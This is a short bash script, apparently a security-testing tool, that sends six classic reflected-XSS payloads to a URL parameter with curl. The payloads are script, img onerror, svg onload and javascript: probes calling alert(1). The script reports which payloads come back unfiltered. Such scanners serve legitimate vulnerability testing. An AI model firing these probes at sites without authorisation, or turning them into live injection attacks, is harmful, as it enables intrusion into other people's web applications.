#!/bin/bash
# xss_test.sh - XSS vulnerability testing
# Usage: ./xss_test.sh URL PARAM

source "$(dirname "$0")/config.sh" 2>/dev/null || true

if [ -z "$1" ]; then
    echo "Usage: $0 URL [PARAM]"
    echo "Example: $0 http://target.com/search q"
    exit 1
fi

URL="$1"
PARAM="${2:-q}"

echo "[*] XSS testing on $URL"

PAYLOADS=(
    "<script>alert(1)</script>"
    "<img src=x onerror=alert(1)>"
    "'\"><script>alert(1)</script>"
    "<svg onload=alert(1)>"
    "javascript:alert(1)"
    "<body onload=alert(1)>"
)

for payload in "${PAYLOADS[@]}"; do
    ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$payload'''))")
    FULL_URL="${URL}?${PARAM}=${ENCODED}"
    
    RESPONSE=$(curl -s "$FULL_URL")
    
    if echo "$RESPONSE" | grep -q "$payload"; then
        echo "[+] REFLECTED: $payload"
    else
        echo "[-] Filtered: $payload"
    fi
done
